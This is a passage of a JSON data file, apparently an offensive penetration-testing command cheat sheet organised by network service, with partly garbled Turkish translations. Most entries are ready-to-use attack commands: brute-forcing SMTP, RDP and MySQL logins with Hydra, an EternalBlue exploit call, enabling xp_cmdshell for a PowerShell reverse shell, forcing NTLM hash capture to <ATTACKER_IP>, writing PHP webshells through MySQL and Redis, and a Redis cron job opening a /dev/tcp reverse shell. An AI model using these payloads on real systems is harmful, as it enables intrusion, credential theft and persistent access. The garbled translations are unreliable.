            "title": "SMTP EXPN User Enum",
            "desc": "Enumerate users via EXPN command",
            "cmd": "smtp-user-enum -M EXPN -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t <TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Listele: users EXPN command üzerinden"
          },
          {
            "title": "SMTP RCPT User Enum",
            "desc": "Enumerate users via RCPT TO method",
            "cmd": "smtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t <TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Listele: users RCPT method üzerinden'e"
          },
          {
            "title": "SMTP Send Email (Swaks)",
            "desc": "Send test email via SMTP",
            "cmd": "swaks --to <VICTIM_EMAIL> --from <SENDER_EMAIL> --server <SMTP_IP> --body 'Test message' --header 'Subject: Test'",
            "tags": [
              "tool"
            ],
            "desc_tr": "Send test email SMTP üzerinden"
          },
          {
            "title": "Hydra SMTP Brute",
            "desc": "Brute force SMTP credentials",
            "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt smtp://<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı SMTP kimlik bilgileri"
          }
        ],
        "name_tr": "SMTP (25/587)"
      },
      {
        "name": "POP3 / IMAP (110/143)",
        "commands": [
          {
            "title": "POP3 Manual Connect",
            "desc": "Connect to POP3 and check mail",
            "cmds": [
              "nc -nv <TARGET_IP> 110",
              "USER <USER>",
              "PASS <PASS>",
              "LIST",
              "RETR 1"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Bağlan: POP3 and check mail'e"
          },
          {
            "title": "IMAP Manual Connect",
            "desc": "Connect to IMAP manually",
            "cmds": [
              "nc -nv <TARGET_IP> 143",
              "a1 LOGIN <USER> <PASS>",
              "a2 LIST '' '*'",
              "a3 SELECT INBOX",
              "a4 FETCH 1 BODY[]"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Bağlan: IMAP manually'e"
          },
          {
            "title": "Hydra POP3 Brute",
            "desc": "Brute force POP3 credentials",
            "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt pop3://<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı POP3 kimlik bilgileri"
          },
          {
            "title": "cURL IMAP Read Mail",
            "desc": "Read emails with curl",
            "cmd": "curl -u <USER>:<PASS> imap://<TARGET_IP>/INBOX",
            "tags": [
              "tool"
            ],
            "desc_tr": "Oku: emails curl ile"
          }
        ],
        "name_tr": "POP3 / IMAP (110/143)"
      },
      {
        "name": "DNS (53)",
        "commands": [
          {
            "title": "DNS Zone Transfer",
            "desc": "Attempt AXFR zone transfer",
            "cmd": "dig axfr <DOMAIN> @<TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Dene: AXFR zone transferi"
          },
          {
            "title": "DNS Reverse Lookup Zone",
            "desc": "Attempt reverse zone transfer",
            "cmd": "dig axfr <REVERSE_ZONE>.in-addr.arpa @<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Dene: reverse zone transferi"
          },
          {
            "title": "DNSChef Spoof",
            "desc": "DNS spoofing proxy",
            "cmd": "dnschef --fakeip <ATTACKER_IP> --fakedomains <TARGET_DOMAIN> --interface <INTERFACE>",
            "tags": [
              "advanced"
            ],
            "desc_tr": "DNS spoofing vekil sunucu (proxy)"
          },
          {
            "title": "Fierce DNS Recon",
            "desc": "DNS reconnaissance with fierce",
            "cmd": "fierce --domain <DOMAIN>",
            "tags": [
              "tool"
            ],
            "desc_tr": "DNS keşif fierce ile"
          }
        ],
        "name_tr": "DNS (53)"
      },
      {
        "name": "HTTP/HTTPS (80/443/8080)",
        "commands": [
          {
            "title": "Nikto Web Scan",
            "desc": "Comprehensive web vulnerability scanner",
            "cmd": "nikto -h http://<TARGET_IP> -o nikto_output.txt",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Kapsamlı web zafiyet(ler) tarayıcı"
          },
          {
            "title": "cURL Headers",
            "desc": "Get HTTP headers and response info",
            "cmd": "curl -I http://<TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Al: HTTP headers and response info"
          },
          {
            "title": "cURL Follow Redirects",
            "desc": "Follow HTTP redirects verbosely",
            "cmd": "curl -Lv http://<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Follow HTTP redirects verbosely"
          },
          {
            "title": "cURL POST Request",
            "desc": "Submit POST data",
            "cmd": "curl -X POST http://<TARGET_IP>/login -d 'username=<USER>&password=<PASS>'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Submit POST data"
          },
          {
            "title": "cURL with Cookie",
            "desc": "Send request with cookie",
            "cmd": "curl -b 'session=<SESSION_VALUE>' http://<TARGET_IP>/admin",
            "tags": [
              "essential"
            ],
            "desc_tr": "Send request cookie ile"
          },
          {
            "title": "whatweb Fingerprint",
            "desc": "Identify web technologies",
            "cmd": "whatweb -a 3 http://<TARGET_IP>",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Tespit et: web technologies"
          },
          {
            "title": "wafw00f WAF Detection",
            "desc": "Detect Web Application Firewalls",
            "cmd": "wafw00f http://<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Algıla: Web ApplicatiFirewalls üzerinde"
          }
        ],
        "name_tr": "HTTP/HTTPS (80/443/8080)"
      },
      {
        "name": "SMB (445/139)",
        "commands": [
          {
            "title": "SMBClient List Shares",
            "desc": "List SMB shares (no auth)",
            "cmd": "smbclient -L //<TARGET_IP>/ -N",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: SMB shares (no auth)"
          },
          {
            "title": "SMBClient Connect Share",
            "desc": "Connect to a specific share",
            "cmd": "smbclient //<TARGET_IP>/<SHARE> -U <USER>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bağlan: a belirli share'e"
          },
          {
            "title": "SMBClient Get File",
            "desc": "Download file from SMB share",
            "cmd": "smbclient //<TARGET_IP>/<SHARE> -U <USER> -c 'get <FILENAME>'",
            "tags": [
              "essential"
            ],
            "desc_tr": "İndir: file SMB share üzerinden"
          },
          {
            "title": "SMBClient Recursive Download",
            "desc": "Download all files from share recursively",
            "cmds": [
              "smbclient //<TARGET_IP>/<SHARE> -U <USER>",
              "smb: \\> recurse ON",
              "smb: \\> prompt OFF",
              "smb: \\> mget *"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "İndir: tüm files share recursively üzerinden"
          },
          {
            "title": "SMBMap Enumerate Shares",
            "desc": "Enumerate shares and permissions",
            "cmd": "smbmap -H <TARGET_IP> -u <USER> -p '<PASS>'",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Listele: shares and permissions"
          },
          {
            "title": "SMBMap Recursive Listing",
            "desc": "List all files on all shares",
            "cmd": "smbmap -H <TARGET_IP> -u <USER> -p '<PASS>' -R",
            "tags": [
              "tool"
            ],
            "desc_tr": "Listele: tüm files tüm shares üzerinde"
          },
          {
            "title": "SMBMap Execute Command",
            "desc": "Execute command via SMBMap",
            "cmd": "smbmap -H <TARGET_IP> -u <USER> -p '<PASS>' -x 'ipconfig'",
            "tags": [
              "tool"
            ],
            "desc_tr": "Çalıştır: command SMBMap üzerinden"
          },
          {
            "title": "Mount SMB Share (Linux)",
            "desc": "Mount SMB share to local directory",
            "cmd": "sudo mount -t cifs //<TARGET_IP>/<SHARE> /mnt/share -o username=<USER>,password=<PASS>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bağla: SMB share yerel directory'e"
          },
          {
            "title": "EternalBlue (MS17-010)",
            "desc": "Exploit EternalBlue SMB vulnerability",
            "cmd": "python3 zzz_exploit.py <TARGET_IP>",
            "tags": [
              "advanced"
            ],
            "note": "Use Metasploit module exploit/windows/smb/ms17_010_eternalblue for reliability",
            "desc_tr": "İstismar et: r EternalBlue SMB zafiyet(ler)"
          }
        ],
        "name_tr": "SMB (445/139)"
      },
      {
        "name": "MSSQL (1433)",
        "commands": [
          {
            "title": "Impacket MSSQL Connect",
            "desc": "Connect to MSSQL with impacket",
            "cmd": "mssqlclient.py <DOMAIN>/<USER>:<PASS>@<TARGET_IP> -windows-auth",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Bağlan: MSSQL impacket ile'e"
          },
          {
            "title": "MSSQL SA Login",
            "desc": "Connect as SA user",
            "cmd": "mssqlclient.py sa:<PASS>@<TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bağlan: as SA user"
          },
          {
            "title": "Impacket MSSQL with DC-IP",
            "desc": "Connect to MSSQL specifying Domain Controller IP for Kerberos/NTLM resolution",
            "cmd": "impacket-mssqlclient <DOMAIN>/<USER>:<PASS>@<TARGET_IP> -dc-ip <DC_IP> -windows-auth",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "DC-IP belirterek MSSQL'e bağlan (Kerberos/NTLM çözümlemesi için)"
          },
          {
            "title": "Impacket MSSQL with Hash",
            "desc": "Connect to MSSQL using NTLM hash (Pass the Hash)",
            "cmd": "impacket-mssqlclient <DOMAIN>/<USER>@<TARGET_IP> -hashes :<NTLM_HASH> -windows-auth",
            "tags": [
              "essential"
            ],
            "desc_tr": "NTLM hash ile MSSQL'e bağlan (Pass the Hash)"
          },
          {
            "title": "Impacket MSSQL Custom Port",
            "desc": "Connect to MSSQL on non-default port",
            "cmd": "impacket-mssqlclient <USER>:<PASS>@<TARGET_IP> -port <PORT>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Varsayılan olmayan port üzerinden MSSQL'e bağlan"
          },
          {
            "title": "Impacket MSSQL Kerberos Auth",
            "desc": "Connect to MSSQL with Kerberos ticket",
            "cmd": "export KRB5CCNAME=<USER>.ccache && impacket-mssqlclient -k <DOMAIN>/<USER>@<TARGET_FQDN> -dc-ip <DC_IP>",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Kerberos ticket ile MSSQL'e bağlan"
          },
          {
            "title": "MSSQL Enum Linked Servers",
            "desc": "Enumerate linked SQL servers for lateral movement",
            "cmds": [
              "SELECT name, provider, data_source FROM sys.servers;",
              "EXEC sp_linkedservers;"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Linked SQL server'ları keşfet (lateral movement için)"
          },
          {
            "title": "MSSQL Execute on Linked Server",
            "desc": "Execute query on linked server via OpenQuery",
            "cmds": [
              "SELECT * FROM OPENQUERY(\"<LINKED_SERVER>\", 'SELECT @@servername');",
              "EXEC ('xp_cmdshell ''whoami''') AT [<LINKED_SERVER>];"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Linked server üzerinde sorgu çalıştır (OpenQuery ile)"
          },
          {
            "title": "MSSQL Impersonate User",
            "desc": "Check and impersonate another SQL user for privilege escalation",
            "cmds": [
              "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';",
              "EXECUTE AS LOGIN = 'sa';",
              "SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin');"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Başka bir SQL kullanıcısını impersonate et (yetki yükseltme)"
          },
          {
            "title": "MSSQL Read File",
            "desc": "Read local file via MSSQL bulk insert",
            "cmd": "SELECT * FROM OPENROWSET(BULK N'C:\\Windows\\System32\\drivers\\etc\\hosts', SINGLE_CLOB) AS Contents;",
            "tags": [
              "advanced"
            ],
            "desc_tr": "MSSQL bulk insert ile yerel dosya oku"
          },
          {
            "title": "MSSQL Reverse Shell via xp_cmdshell",
            "desc": "Get reverse shell through MSSQL xp_cmdshell",
            "cmd": "EXEC xp_cmdshell 'powershell -e <BASE64_PAYLOAD>';",
            "tags": [
              "essential"
            ],
            "desc_tr": "xp_cmdshell üzerinden reverse shell al"
          },
          {
            "title": "MSSQL Enable xp_cmdshell",
            "desc": "Enable xp_cmdshell for OS command execution",
            "cmds": [
              "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;",
              "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
              "EXEC xp_cmdshell 'whoami';"
            ],
            "tags": [
              "essential"
            ],
            "desc_tr": "Etkinleştir: xp_cmdshell for OS komut enjeksiyonu"
          },
          {
            "title": "MSSQL List Databases",
            "desc": "List all databases",
            "cmd": "SELECT name FROM master.dbo.sysdatabases;",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: tüm databases"
          },
          {
            "title": "MSSQL List Users",
            "desc": "List database users and roles",
            "cmd": "SELECT name, type_desc FROM sys.server_principals WHERE type IN ('S','U','G');",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: database users and roles"
          },
          {
            "title": "MSSQL Steal Hash (Responder)",
            "desc": "Force NTLM auth to capture hash",
            "cmd": "EXEC xp_dirtree '\\\\<ATTACKER_IP>\\share';",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Zorla: NTLM auth capture hash'e"
          },
          {
            "title": "MSSQL Write File",
            "desc": "Write file via OLE Automation",
            "cmds": [
              "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;",
              "DECLARE @obj INT; EXEC sp_OACreate 'Scripting.FileSystemObject', @obj OUTPUT; EXEC sp_OAMethod @obj, 'CreateTextFile', NULL, 'C:\\Temp\\test.txt', 1;"
            ],
            "tags": [
              "advanced"
            ],
            "desc_tr": "Yaz: file OLE Automatiüzerinden üzerinde"
          },
          {
            "title": "Sqsh MSSQL Connect",
            "desc": "Connect to MSSQL with sqsh",
            "cmd": "sqsh -S <TARGET_IP> -U <USER> -P '<PASS>' -D <DATABASE>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Bağlan: MSSQL sqsh ile'e"
          }
        ],
        "name_tr": "MSSQL (1433)"
      },
      {
        "name": "MySQL (3306)",
        "commands": [
          {
            "title": "MySQL Connect Local",
            "desc": "Connect to MySQL locally",
            "cmd": "mysql -u <USER> -p'<PASS>' -h <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bağlan: MySQL locally'e"
          },
          {
            "title": "MySQL Show Databases",
            "desc": "List all databases",
            "cmd": "SHOW DATABASES;",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: tüm databases"
          },
          {
            "title": "MySQL Show Tables",
            "desc": "List tables in current database",
            "cmd": "USE <DATABASE>; SHOW TABLES;",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: tables mevcut database içinde"
          },
          {
            "title": "MySQL Dump All Databases",
            "desc": "Dump all databases",
            "cmd": "mysqldump -u <USER> -p'<PASS>' -h <TARGET_IP> --all-databases > dump.sql",
            "tags": [
              "essential"
            ],
            "desc_tr": "Dökümle: tüm databases"
          },
          {
            "title": "MySQL Read File",
            "desc": "Read local file via MySQL",
            "cmd": "SELECT LOAD_FILE('/etc/passwd');",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Oku: yerel file MySQL üzerinden"
          },
          {
            "title": "MySQL Write File (INTO OUTFILE)",
            "desc": "Write webshell via MySQL",
            "cmd": "SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Yaz: web kabuğu MySQL üzerinden"
          },
          {
            "title": "MySQL User Hashes",
            "desc": "Dump MySQL user hashes",
            "cmd": "SELECT user, authentication_string FROM mysql.user;",
            "tags": [
              "essential"
            ],
            "desc_tr": "Dökümle: MySQL user hashes"
          },
          {
            "title": "Hydra MySQL Brute",
            "desc": "Brute force MySQL credentials",
            "cmd": "hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı MySQL kimlik bilgileri"
          }
        ],
        "name_tr": "MySQL (3306)"
      },
      {
        "name": "RDP (3389)",
        "commands": [
          {
            "title": "RDP Connect (xfreerdp)",
            "desc": "Connect to RDP with xfreerdp",
            "cmd": "xfreerdp /u:<USER> /p:'<PASS>' /v:<TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bağlan: RDP xfreerdp ile'e"
          },
          {
            "title": "RDP with Domain",
            "desc": "Connect to RDP with domain credentials",
            "cmd": "xfreerdp /u:<USER> /d:<DOMAIN> /p:'<PASS>' /v:<TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bağlan: RDP domakimlik bilgileri ile'e içinde"
          },
          {
            "title": "RDP Pass-the-Hash",
            "desc": "Connect to RDP using NTLM hash (Restricted Admin required)",
            "cmd": "xfreerdp /u:<USER> /d:<DOMAIN> /pth:<NTLM_HASH> /v:<TARGET_IP> /cert-ignore",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Bağlan: RDP NTLM hash (Restricted Admrequired) kullanarak'e içinde"
          },
          {
            "title": "RDP Drive Mount",
            "desc": "Mount local drive in RDP session",
            "cmd": "xfreerdp /u:<USER> /p:'<PASS>' /v:<TARGET_IP> /drive:share,/tmp",
            "tags": [
              "tool"
            ],
            "desc_tr": "Bağla: yerel drive RDP session içinde"
          },
          {
            "title": "RDP Ignore Cert",
            "desc": "Ignore certificate warnings",
            "cmd": "xfreerdp /u:<USER> /p:'<PASS>' /v:<TARGET_IP> /cert-ignore",
            "tags": [
              "essential"
            ],
            "desc_tr": "Ignore certificate warnings"
          },
          {
            "title": "NLA Bypass Check",
            "desc": "Connect without NLA for older systems",
            "cmd": "xfreerdp /u:<USER> /p:'<PASS>' /v:<TARGET_IP> -sec-nla",
            "tags": [
              "tool"
            ],
            "desc_tr": "Bağlan: NLA for older systems olmadan"
          },
          {
            "title": "Hydra RDP Brute",
            "desc": "Brute force RDP credentials",
            "cmd": "hydra -l <USER> -P /usr/share/wordlists/rockyou.txt rdp://<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı RDP kimlik bilgileri"
          },
          {
            "title": "RDesktop Connect",
            "desc": "Connect via rdesktop",
            "cmd": "rdesktop -u <USER> -p '<PASS>' <TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Bağlan: rdesktop üzerinden"
          }
        ],
        "name_tr": "RDP (3389)"
      },
      {
        "name": "VNC (5900)",
        "commands": [
          {
            "title": "VNC Connect",
            "desc": "Connect to VNC server",
            "cmd": "vncviewer <TARGET_IP>:<PORT>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bağlan: VNC server'e"
          },
          {
            "title": "Hydra VNC Brute",
            "desc": "Brute force VNC password",
            "cmd": "hydra -P /usr/share/wordlists/rockyou.txt vnc://<TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kaba kuvvet: kuvvet saldırısı VNC password"
          },
          {
            "title": "Nmap VNC Auth Check",
            "desc": "Check VNC authentication type",
            "cmd": "nmap -sV --script vnc-info,vnc-brute <TARGET_IP>",
            "tags": [
              "tool"
            ],
            "desc_tr": "Kontrol et: VNC kimlik doğrulama type"
          }
        ],
        "name_tr": "VNC (5900)"
      },
      {
        "name": "Redis (6379)",
        "commands": [
          {
            "title": "Redis Connect (No Auth)",
            "desc": "Connect to unauthenticated Redis",
            "cmd": "redis-cli -h <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bağlan: unauthenticated Redis'e"
          },
          {
            "title": "Redis Auth",
            "desc": "Authenticate to Redis",
            "cmd": "redis-cli -h <TARGET_IP> -a '<PASS>'",
            "tags": [
              "essential"
            ],
            "desc_tr": "kimlik doğrulama Redis'e"
          },
          {
            "title": "Redis Info",
            "desc": "Get Redis server information",
            "cmd": "redis-cli -h <TARGET_IP> INFO",
            "tags": [
              "essential"
            ],
            "desc_tr": "Al: Redis server information"
          },
          {
            "title": "Redis List Keys",
            "desc": "List all keys in database",
            "cmd": "redis-cli -h <TARGET_IP> KEYS '*'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: tüm keys database içinde"
          },
          {
            "title": "Redis Get All Values",
            "desc": "Dump all key-value pairs",
            "cmd": "redis-cli -h <TARGET_IP> --scan | xargs redis-cli -h <TARGET_IP> MGET",
            "tags": [
              "essential"
            ],
            "desc_tr": "Dökümle: tüm key-value pairs"
          },
          {
            "title": "Redis Write SSH Key",
            "desc": "Write SSH authorized_keys via Redis",
            "cmds": [
              "redis-cli -h <TARGET_IP> CONFIG SET dir /root/.ssh",
              "redis-cli -h <TARGET_IP> CONFIG SET dbfilename authorized_keys",
              "redis-cli -h <TARGET_IP> SET pwn '\\n\\n<SSH_PUBLIC_KEY>\\n\\n'",
              "redis-cli -h <TARGET_IP> BGSAVE"
            ],
            "tags": [
              "advanced"
            ],
            "desc_tr": "Yaz: SSH authorized_keys Redis üzerinden"
          },
          {
            "title": "Redis Write Webshell",
            "desc": "Write PHP webshell via Redis",
            "cmds": [
              "redis-cli -h <TARGET_IP> CONFIG SET dir /var/www/html",
              "redis-cli -h <TARGET_IP> CONFIG SET dbfilename shell.php",
              "redis-cli -h <TARGET_IP> SET shell '<?php system($_GET[\"cmd\"]); ?>'",
              "redis-cli -h <TARGET_IP> BGSAVE"
            ],
            "tags": [
              "advanced"
            ],
            "desc_tr": "Yaz: PHP web kabuğu Redis üzerinden"
          },
          {
            "title": "Redis Cron Job RCE",
            "desc": "Write cron job for reverse shell via Redis",
            "cmds": [
              "redis-cli -h <TARGET_IP> CONFIG SET dir /var/spool/cron/crontabs",
              "redis-cli -h <TARGET_IP> CONFIG SET dbfilename root",
              "redis-cli -h <TARGET_IP> SET shell '\\n\\n* * * * * /bin/bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1\\n\\n'",
              "redis-cli -h <TARGET_IP> BGSAVE"
            ],
            "tags": [
              "advanced"
            ],
            "desc_tr": "Yaz: crgörevleri for ters bağlantı kabuğu Redis üzerinden üzerinde"
          }
        ],
        "name_tr": "Redis (6379)"
      },
      {
        "name": "MongoDB (27017)",
        "commands": [
          {
            "title": "MongoDB Connect (No Auth)",
            "desc": "Connect to unauthenticated MongoDB",
            "cmd": "mongo <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bağlan: unauthenticated MongoDB'e"
          },
          {
            "title": "MongoDB List Databases",
            "desc": "Show all databases",
            "cmd": "show dbs",
            "tags": [
              "essential"
            ],
            "desc_tr": "Göster: tüm databases"
          },
          {
            "title": "MongoDB List Collections",
            "desc": "Show collections in current DB",
            "cmd": "use <DATABASE>; show collections;",
            "tags": [
              "essential"
            ],
            "desc_tr": "Göster: collections mevcut DB içinde"
          },
          {
            "title": "MongoDB Dump All",
            "desc": "Dump all MongoDB data",
            "cmd": "mongodump --host <TARGET_IP> --out /tmp/mongodump",
            "tags": [
              "essential"
            ],
            "desc_tr": "Dökümle: tüm MongoDB data"
          },
          {
            "title": "MongoDB NoSQLi Auth Bypass",
            "desc": "Authentication bypass via NoSQL injection",
            "cmd": "curl -X POST http://<TARGET_IP>/login -H 'Content-Type: application/json' -d '{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}'",
            "tags": [
              "advanced"
            ],
            "desc_tr": "kimlik doğrulama bypass NoSQL enjeksiyüzerinden üzerinde"
          }
        ],
        "name_tr": "MongoDB (27017)"
      },
      {
        "name": "NFS (2049)",
        "commands": [
          {
            "title": "Show NFS Exports",
            "desc": "List NFS exported directories",
            "cmd": "showmount -e <TARGET_IP>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: NFS exported directories"
          },
          {
            "title": "Mount NFS Share",
            "desc": "Mount NFS share locally",
            "cmd": "sudo mount -t nfs <TARGET_IP>:<EXPORT_PATH> /mnt/nfs",
            "tags": [
              "essential"
            ],
            "desc_tr": "Bağla: NFS share locally"
          },
          {
            "title": "Mount NFS v3",
            "desc": "Force NFS version 3",
            "cmd": "sudo mount -t nfs -o vers=3 <TARGET_IP>:<EXPORT_PATH> /mnt/nfs",
            "tags": [
              "tool"
            ],
            "desc_tr": "Zorla: NFS versi3 üzerinde"
          },
          {
            "title": "NFS no_root_squash Abuse",
            "desc": "Write SUID bash if no_root_squash is set",
            "cmds": [
              "sudo mount -t nfs <TARGET_IP>:<EXPORT_PATH> /mnt/nfs",
              "cp /bin/bash /mnt/nfs/bash",
              "sudo chmod +s /mnt/nfs/bash"
            ],
            "tags": [
              "advanced"
            ],
            "note": "Then on target: /tmp/bash -p",
            "desc_tr": "Yaz: SUID bash if no_root_squash is set"
          }
        ],
        "name_tr": "NFS (2049)"
      },
      {
        "name": "LDAP (389/636)",
        "commands": [
          {
            "title": "LDAP Anonymous Bind",
            "desc": "Test anonymous LDAP bind",
            "cmd": "ldapsearch -x -H ldap://<TARGET_IP> -b 'dc=<DC>,dc=<TLD>'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Test et: anonymous LDAP bind"
          },
          {
            "title": "LDAP Authenticated Bind",
            "desc": "Query LDAP with credentials",
            "cmd": "ldapsearch -x -H ldap://<TARGET_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'dc=<DC>,dc=<TLD>'",
            "tags": [
              "essential"
            ],
            "desc_tr": "Sorgula: LDAP kimlik bilgileri ile"
          },
          {
            "title": "LDAP Dump All Users",
            "desc": "Enumerate all AD users",
            "cmd": "ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'dc=<DC>,dc=<TLD>' '(objectClass=user)' sAMAccountName userPrincipalName memberOf",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: tüm AD users"
          },
          {
            "title": "LDAP Dump All Computers",
            "desc": "List all computer objects",
            "cmd": "ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'dc=<DC>,dc=<TLD>' '(objectClass=computer)' name operatingSystem",
            "tags": [
              "essential"
            ],
            "desc_tr": "Listele: tüm computer objects"
          },
          {
            "title": "LDAP Dump Domain Admins",
            "desc": "Get Domain Admin group members",
            "cmd": "ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'dc=<DC>,dc=<TLD>' '(memberOf=CN=Domain Admins,CN=Users,DC=<DC>,DC=<TLD>)' sAMAccountName",
            "tags": [
              "essential"
            ],
            "desc_tr": "Al: DomaAdmin grup üyelikleri içinde"
          },
          {
            "title": "LDAP Password in Attributes",
            "desc": "Search for passwords in LDAP attributes",
            "cmd": "ldapsearch -x -H ldap://<DC_IP> -D '<USER>@<DOMAIN>' -w '<PASS>' -b 'dc=<DC>,dc=<TLD>' '(description=*pass*)' sAMAccountName description",
            "tags": [
              "advanced"
            ],
            "desc_tr": "Ara: for passwords LDAP attributes içinde"
          },
          {
            "title": "ldapdomaindump",
            "desc": "Comprehensive LDAP dump to HTML/JSON",
            "cmd": "ldapdomaindump -u '<DOMAIN>\\<USER>' -p '<PASS>' <DC_IP> -o /tmp/ldap_dump",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Kapsamlı LDAP dump HTML/JSON'e"
          }
        ],
        "name_tr": "LDAP (389/636)"
      },
      {
        "name": "WinRM (5985/5986)",
        "commands": [
          {
            "title": "Evil-WinRM Connect",
            "desc": "Connect to WinRM with Evil-WinRM",
            "cmd": "evil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>'",
            "tags": [
              "essential",
              "tool"
            ],
            "desc_tr": "Bağlan: WinRM Evil-WinRM ile'e"
          },
          {
            "title": "Evil-WinRM with Hash",
            "desc": "Pass-the-hash via WinRM",
            "cmd": "evil-winrm -i <TARGET_IP> -u <USER> -H <NTLM_HASH>",
            "tags": [
              "essential"
            ],
            "desc_tr": "Pass-the-hash WinRM üzerinden"
          },
          {
            "title": "Evil-WinRM with SSL",
            "desc": "Connect to WinRM with SSL (5986)",
            "cmd": "evil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>' -S",
            "tags": [
              "tool"
            ],
            "desc_tr": "Bağlan: WinRM SSL (5986) ile'e"
          },
          {
            "title": "Evil-WinRM File Upload",
            "desc": "Upload file to target",
            "cmd": "evil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>' -s /path/to/scripts/ -e /path/to/executables/",
            "tags": [
              "tool"
            ],
            "desc_tr": "Yükle: file target'e"
          },
          {
            "title": "Evil-WinRM Run Script",
            "desc": "Load and run PowerShell script",
            "cmd": "Invoke-Binary /path/to/script.ps1",
            "tags": [
              "tool"
            ],
            "note": "Run inside evil-winrm session",
            "desc_tr": "Yükle: and run PowerShell script"
          },
          {
            "title": "Evil-WinRM Upload (In-Session)",
            "desc": "Upload file from within evil-winrm session",
            "cmd": "upload /local/path/file.exe C:\\Windows\\Temp\\file.exe",
            "tags": [
              "essential"
            ],
            "note": "Run inside evil-winrm session",
            "desc_tr": "Yükle: file withevil-winrm sessiüzerinden üzerinde içinde"
          },
          {
            "title": "Evil-WinRM Download (In-Session)",
            "desc": "Download file from target within session",
            "cmd": "download C:\\Users\\<USER>\\Desktop\\flag.txt /local/path/flag.txt",
            "tags": [
              "essential"
            ],
            "note": "Run inside evil-winrm session",
            "desc_tr": "İndir: file target withsessiüzerinden üzerinde içinde"
          },
          {
            "title": "Evil-WinRM Execute PS Script (In-Session)",
            "desc": "Execute a PowerShell script in memory",
            "cmd": "Invoke-Expression (Get-Content script.ps1)",
            "tags": [
              "tool"
            ],
            "note": "Run inside evil-winrm session",
            "desc_tr": "Çalıştır: a PowerShell script memory içinde"
          },
          {
            "title": "Evil-WinRM Menu (In-Session)",
            "desc": "Show all available Evil-WinRM built-in commands",
            "cmd": "menu",
            "tags": [
              "essential"
            ],
            "note": "Run inside evil-winrm session",
            "desc_tr": "Evil-WinRM yerleşik komutlarını listele"
          },
          {
